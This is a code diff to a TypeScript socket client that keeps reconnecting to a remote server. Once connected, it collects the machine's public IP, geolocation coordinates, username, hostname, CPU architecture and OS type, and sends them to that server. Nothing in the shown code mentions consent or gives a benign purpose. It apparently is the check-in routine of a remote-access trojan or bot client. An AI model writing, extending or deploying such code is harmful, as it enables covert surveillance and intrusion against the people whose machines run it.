@@ -25,40 +25,34 @@ function connectSocket (): void {
 
   socket.on('error', () => {
     isConnected = false
+    console.log('serve error: ', new Date().toISOString())
     setTimeout(connectSocket, 5000)
   })
 
-  socket.on('close', () => {
-    isConnected = false
-    setTimeout(connectSocket, 5000)
-  })
+  socket.on('ready', async () => {
+    const ip: string = await publicIpv4()
+    const ipModel = new Ip(ip)
 
-  socket.on('connect', async () => {
-    if (!isConnected) {
-      const ip: string = await publicIpv4()
-      const ipModel = new Ip(ip)
+    await ipModel.query()
 
-      await ipModel.query()
-
-      const data = {
-        ip,
-        username: os.userInfo().username,
-        hostname: os.hostname(),
-        country: ipModel.country,
-        lat: ipModel.lat,
-        lon: ipModel.lon,
-        regionName: ipModel.regionName,
-        cpu: os.arch(),
-        os: os.type()
-      }
-
-      console.log(data)
-
-      socket.write(Buffer.from(JSON.stringify(data)))
-
-      console.log('Server connected!')
-      isConnected = true
+    const data = {
+      ip,
+      username: os.userInfo().username,
+      hostname: os.hostname(),
+      country: ipModel.country,
+      lat: ipModel.lat,
+      lon: ipModel.lon,
+      regionName: ipModel.regionName,
+      cpu: os.arch(),
+      os: os.type()
     }
+
+    console.log(data)
+
+    socket.write(Buffer.from(JSON.stringify(data)))
+
+    console.log('Server connected!')
+    isConnected = true
   })
 }
 
